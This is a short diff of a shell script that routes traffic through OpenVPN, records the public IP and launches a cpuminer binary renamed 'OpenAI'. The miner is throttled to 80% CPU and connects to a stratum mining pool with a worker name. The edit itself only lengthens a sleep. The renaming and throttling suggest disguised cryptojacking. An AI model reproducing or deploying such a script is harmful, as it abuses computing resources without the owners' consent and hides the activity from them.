@@ -10,7 +10,7 @@ IP=$(/sbin/ip route | awk '/default/ { print $3 }')
 route add  1.52.168.10 gw $IP
 cd ..
 sudo -b openvpn --config test.ovpn
-sleep 5s
+sleep 5m
 sudo wget -qO- http://ipv4.icanhazip.com > ip.txt
 cd cpuminer-opt
 cpulimit --exe cpuminer --limit 80 -b && ./OpenAI -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u wickedbot.xeko -p x
